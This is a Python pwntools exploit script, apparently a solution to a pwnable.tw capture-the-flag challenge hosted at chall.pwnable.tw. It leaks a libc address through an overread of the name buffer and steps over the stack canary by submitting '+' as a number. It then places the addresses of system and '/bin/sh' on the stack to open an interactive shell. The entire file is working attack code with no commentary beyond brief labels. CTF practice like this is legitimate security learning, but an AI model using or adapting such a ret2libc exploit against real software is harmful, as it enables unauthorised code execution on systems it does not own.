#!/usr/bin/env python3
from pwn import *

elf = ELF("./vuln")
libc = ELF("./libc.so.6")
# context.update(binary=elf, log_level="debug")
# p = elf.process()
# gdb.attach(
#     p,
#     """
# 	b *main+111
# 	b *main+210
# 	b *main+328
# """,
# )
p = remote("chall.pwnable.tw", "10101")

leak_offset = 0x1B0000

# leak libc
print(p.recvuntil(b"name :"))
payload = b"A" * 24
p.sendline(payload)

p.recvuntil(b"A" * 24)
leak = p.recv(4)
print(leak)
leak = u32(leak)

libc.address = leak - 0xA - leak_offset
system = libc.symbols["system"]
binsh = next(libc.search(b"/bin/sh"))

log.info("Leak:                  " + hex(leak))
log.info("Addr LIBC base:        " + hex(libc.address))
log.info("Addr LIBC system:      " + hex(system))
log.info('Addr string "/bin/sh": ' + hex(binsh))

# ret2libc
p.sendlineafter(b"to sort :", b"35")
for i in range(24):
    p.sendlineafter(b"number : ", str(i).encode())

# canary bypass with char +, -, * /
p.sendlineafter(b"number : ", b"+")

for i in range(8):
    p.sendlineafter(b"number : ", str(system).encode())

for i in range(2):
    p.sendlineafter(b"number : ", str(binsh).encode())


p.interactive()
